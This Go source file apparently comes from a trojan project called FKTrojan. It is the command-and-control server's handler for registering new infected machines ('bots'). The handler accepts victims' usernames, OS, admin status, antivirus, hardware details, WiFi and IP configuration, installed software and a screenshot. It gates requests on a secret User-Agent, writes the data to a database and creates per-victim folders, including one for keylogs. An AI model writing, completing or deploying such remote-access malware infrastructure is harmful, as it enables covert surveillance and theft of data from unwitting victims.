/*
Author: FreeKnight
*/
//------------------------------------------------------------
package server

//------------------------------------------------------------
import (
	"FKTrojan/common"
	"database/sql"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"
)

//------------------------------------------------------------
// 获取用户基本信息
func NewHandler(response http.ResponseWriter, request *http.Request) {
	if isEnabled {
		if isNew {
			if request.UserAgent() == UserAgentKey {

				request.ParseForm()

				GUID := request.FormValue("0")
				IP := request.FormValue("1")
				WHOAMI := request.FormValue("2")
				OS := request.FormValue("3")
				INSTALL := request.FormValue("4")
				ADMIN := request.FormValue("5")
				AV := request.FormValue("6")
				CPU := request.FormValue("7")
				GPU := request.FormValue("8")
				VERSION := request.FormValue("9")
				SYSINFO := request.FormValue("10")
				WIFIINFO := request.FormValue("11")
				IPCON := request.FormValue("12")
				INSTSOFT := request.FormValue("13")
				INTPIC := request.FormValue("14")

				var tmpguid string
				err := DBPointer.QueryRow("SELECT guid FROM clients WHERE guid=?", GUID).Scan(&tmpguid)
				switch {
				case err == sql.ErrNoRows:
					_, err = DBPointer.Exec("INSERT INTO clients(guid, ip, whoami, os, installdate, isadmin, antivirus, cpuinfo, gpuinfo, clientversion, lastcheckin, lastcommand) VALUES(?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
						GUID, IP, WHOAMI, OS, INSTALL, ADMIN, AV, CPU, GPU, VERSION, time.Now().Format(time.RFC850), "Not Completed....")
					if err != nil {
						FKLog("ERROR with Database! " + err.Error())
						return
					}

					_ = CreateDir("./Profiles/"+GUID+"/", 777)
					_ = CreateDir("./Profiles/"+GUID+"/Files", 777)
					_ = CreateDir("./Profiles/"+GUID+"/Screenshots", 777)
					_ = CreateDir("./Profiles/"+GUID+"/Keylogs", 777)
					_ = CreateDir("./Profiles/"+GUID+"/Results", 777)

					writefile, _ := os.Create("./Profiles/" + GUID + "/Screenshots/Default.png")
					writefile.WriteString(string(common.Base64Decode(INTPIC)))
					writefile.Close()

					output := strings.Replace(common.Base64Decode(INSTSOFT), "|", "\n", -1)

					_ = CreateFileAndWriteData("./Profiles/"+GUID+"/Files/System Information.txt", []byte(common.Base64Decode(SYSINFO)))
					_ = CreateFileAndWriteData("./Profiles/"+GUID+"/Files/WiFi Information.txt", []byte(common.Base64Decode(WIFIINFO)))
					_ = CreateFileAndWriteData("./Profiles/"+GUID+"/Files/IP Config.txt", []byte(common.Base64Decode(IPCON)))
					_ = CreateFileAndWriteData("./Profiles/"+GUID+"/Files/Installed Software.txt", []byte(output))

					FKLog("New bot registered " + GUID)

					fmt.Fprintf(response, "ok")
				case err != nil:
					fmt.Fprintf(response, "err")
				default:
					fmt.Fprintf(response, "exist")
				}
			}
		}
	}
}

//------------------------------------------------------------
